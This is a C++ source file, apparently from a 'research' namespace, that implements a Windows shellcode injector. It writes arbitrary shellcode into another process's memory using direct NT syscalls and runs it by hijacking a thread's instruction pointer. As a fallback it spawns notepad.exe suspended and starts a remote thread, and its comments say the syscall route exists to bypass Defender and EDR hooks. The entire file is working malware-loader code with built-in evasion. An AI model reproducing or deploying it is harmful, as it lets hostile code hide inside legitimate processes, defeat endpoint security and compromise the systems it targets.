#include "inject/inject.hpp"

#include "syscall/syscall.hpp"
#include "native/native_api.hpp"

#include <windows.h>
#include <tlhelp32.h>

#include <cstring>
#include <string>
#include <vector>

namespace research::inject {

namespace {

// Fallback to standard Windows APIs when direct syscalls are unavailable.
bool FallbackWriteRemote(HANDLE hProcess, const std::vector<std::uint8_t>& sc, PVOID* out_addr) {
    PVOID addr = VirtualAllocEx(hProcess, nullptr, sc.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!addr) return false;

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, addr, sc.data(), sc.size(), &written) || written != sc.size()) {
        VirtualFreeEx(hProcess, addr, 0, MEM_RELEASE);
        return false;
    }

    DWORD old = 0;
    if (!VirtualProtectEx(hProcess, addr, sc.size(), PAGE_EXECUTE_READ, &old)) {
        VirtualFreeEx(hProcess, addr, 0, MEM_RELEASE);
        return false;
    }

    *out_addr = addr;
    return true;
}

bool FallbackThreadHijack(HANDLE hProcess, HANDLE hThread, PVOID remote_shellcode) {
    if (SuspendThread(hThread) == (DWORD)-1) return false;

    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        ResumeThread(hThread);
        return false;
    }

    ctx.Rip = reinterpret_cast<uintptr_t>(remote_shellcode);

    if (!SetThreadContext(hThread, &ctx)) {
        ResumeThread(hThread);
        return false;
    }

    ResumeThread(hThread);
    return true;
}

DWORD FindProcessId(const wchar_t* name) {
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (lstrcmpiW(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

HANDLE OpenFirstThread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return nullptr;

    HANDLE hThread = nullptr;
    THREADENTRY32 te{};
    te.dwSize = sizeof(te);
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (hThread) break;
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return hThread;
}

} // namespace

bool WriteShellcodeRemote(HANDLE hProcess, const std::vector<std::uint8_t>& sc, PVOID* out_addr) {
    auto& scd = research::syscall::GetDispatcher();
    if (scd.NtAllocateVirtualMemory && scd.NtWriteVirtualMemory && scd.NtProtectVirtualMemory) {
        PVOID addr = nullptr;
        SIZE_T size = sc.size();
        NTSTATUS st = scd.NtAllocateVirtualMemory(hProcess, &addr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(st)) return false;

        SIZE_T written = 0;
        st = scd.NtWriteVirtualMemory(hProcess, addr, const_cast<void*>(static_cast<const void*>(sc.data())), sc.size(), &written);
        if (!NT_SUCCESS(st) || written != sc.size()) {
            scd.NtFreeVirtualMemory(hProcess, &addr, &size, MEM_RELEASE);
            return false;
        }

        ULONG old = 0;
        st = scd.NtProtectVirtualMemory(hProcess, &addr, &size, PAGE_EXECUTE_READ, &old);
        if (!NT_SUCCESS(st)) {
            scd.NtFreeVirtualMemory(hProcess, &addr, &size, MEM_RELEASE);
            return false;
        }

        *out_addr = addr;
        return true;
    }

    return FallbackWriteRemote(hProcess, sc, out_addr);
}

bool ThreadHijack(HANDLE hProcess, HANDLE hThread, PVOID remote_shellcode) {
    auto& scd = research::syscall::GetDispatcher();
    if (scd.NtSuspendThread && scd.NtResumeThread) {
        ULONG prev = 0;
        NTSTATUS st = scd.NtSuspendThread(hThread, &prev);
        if (!NT_SUCCESS(st)) return false;

        CONTEXT ctx{};
        ctx.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(hThread, &ctx)) {
            scd.NtResumeThread(hThread, &prev);
            return false;
        }

        ctx.Rip = reinterpret_cast<uintptr_t>(remote_shellcode);

        if (!SetThreadContext(hThread, &ctx)) {
            scd.NtResumeThread(hThread, &prev);
            return false;
        }

        scd.NtResumeThread(hThread, &prev);
        return true;
    }

    return FallbackThreadHijack(hProcess, hThread, remote_shellcode);
}

HANDLE SpawnSuspended(const wchar_t* exe_path, DWORD* out_pid, HANDLE* out_thread) {
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};

    if (!CreateProcessW(exe_path, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        return nullptr;
    }

    if (out_pid) *out_pid = pi.dwProcessId;
    if (out_thread) *out_thread = pi.hThread;
    return pi.hProcess;
}

HANDLE RemoteThreadSyscall(HANDLE hProcess, PVOID start_address) {
    auto& scd = research::syscall::GetDispatcher();
    if (!scd.NtCreateThreadEx) {
        return nullptr;
    }

    HANDLE hThread = nullptr;
    // NtCreateThreadEx(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
    //                  StartRoutine, Argument, CreateFlags, ZeroBits, StackSize,
    //                  MaximumStackSize, AttributeList)
    NTSTATUS st = scd.NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        nullptr,
        hProcess,
        start_address,
        nullptr,
        0,     // CreateFlags
        0,     // ZeroBits
        0,     // StackSize
        0,     // MaximumStackSize
        nullptr);

    if (!NT_SUCCESS(st) || !hThread) {
        return nullptr;
    }
    return hThread;
}

bool Inject(const std::vector<std::uint8_t>& shellcode, const wchar_t* target_process) {
    if (!target_process || target_process[0] == L'\0') {
        return false;
    }

    // Strategy 1: inject into the specified target process.
    DWORD pid = FindProcessId(target_process);
    if (pid != 0) {
        HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (hProcess) {
            PVOID remote_addr = nullptr;
            if (WriteShellcodeRemote(hProcess, shellcode, &remote_addr)) {
                HANDLE hThread = OpenFirstThread(pid);
                if (hThread) {
                    if (ThreadHijack(hProcess, hThread, remote_addr)) {
                        CloseHandle(hThread);
                        CloseHandle(hProcess);
                        return true;
                    }
                    CloseHandle(hThread);
                }
            }
            CloseHandle(hProcess);
        }
    }

    // Strategy 2: spawn notepad.exe suspended, create a remote thread via
    // NtCreateThreadEx direct syscall, then resume notepad's main thread.
    // Using the syscall bypasses Defender/EDR hooks on CreateRemoteThread.
    DWORD notepad_pid = 0;
    HANDLE hNotepadThread = nullptr;
    HANDLE hNotepad = SpawnSuspended(L"C:\\Windows\\System32\\notepad.exe", &notepad_pid, &hNotepadThread);
    if (hNotepad && hNotepadThread) {
        PVOID remote_addr = nullptr;
        if (WriteShellcodeRemote(hNotepad, shellcode, &remote_addr)) {
            HANDLE hRemoteThread = RemoteThreadSyscall(hNotepad, remote_addr);
            if (hRemoteThread) {
                ResumeThread(hNotepadThread);
                CloseHandle(hRemoteThread);
                CloseHandle(hNotepadThread);
                CloseHandle(hNotepad);
                return true;
            }
        }
        TerminateProcess(hNotepad, 0);
        CloseHandle(hNotepadThread);
        CloseHandle(hNotepad);
    }

    return false;
}

} // namespace research::inject
